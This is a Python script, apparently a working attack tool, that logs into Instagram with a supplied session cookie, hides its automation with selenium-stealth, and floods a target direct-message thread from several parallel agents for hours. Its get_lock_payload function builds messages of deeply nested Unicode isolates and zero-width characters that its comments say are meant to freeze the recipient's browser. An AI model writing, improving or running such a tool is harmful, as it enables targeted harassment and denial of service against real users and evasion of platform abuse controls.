# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (EXECUTION-LOCK V29)
# 📅 STATUS: UI-THREAD-LOCK | 4-AGENT TOTAL | 32GB-AWS-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.3)    
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_lock_payload():
    """Forces the browser's main thread to freeze by nesting isolates and joiners."""
    u_id = random.randint(1000, 9999)
    # \u200D (ZWJ) - Forces glyph bonding 
    # \u2068 (FSI) - Forces deep render tree 
    # \u200B (ZWSP) - Forces infinite line-wrap checks
    zwj, iso, brk, pop = "\u200D", "\u2068", "\u200B", "\u2069"
    
    header = f"👑 PRAVEER OWNS THE MATRIX 👑 [KILL_NODE:{u_id}]"
    
    body = []
    # 350 lines of recursive depth to max out AWS CPU
    for i in range(350):
        # We nest isolates 6 levels deep to hit the browser's stack limit
        depth = f"{iso}{iso}{iso}{iso}{iso}{iso}"
        # Mixing font families with ZWJ to break the font-fallback cache
        line = f"{depth}𝕻{zwj}X{zwj}{i}{zwj}𝕬{zwj}O{brk}{pop*6}"
        body.append(line)
        
    return f"{header}\n\u2060".join(body).strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu") # Force CPU to handle the heavy shaping
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
        # Direct JS injection to keep the sender's side fast
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
        time.sleep(0.3)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            if adaptive_send(driver, "🚀 4-AGENT EXECUTION LOCK ACTIVE"):
                while (time.time() - global_start) < TOTAL_DURATION:
                    payload = get_lock_payload()
                    if adaptive_send(driver, payload):
                        strike_counter += 1
                        with COUNTER_LOCK:
                            global GLOBAL_SENT
                            GLOBAL_SENT += 1
                        
                        if strike_counter % REST_AFTER_STRIKES == 0:
                            log_status(agent_id, "✅ 100 Strikes. Resting.")
                            time.sleep(REST_DURATION)
                        else:
                            log_status(agent_id, f"Delivered ({GLOBAL_SENT})")
                    time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
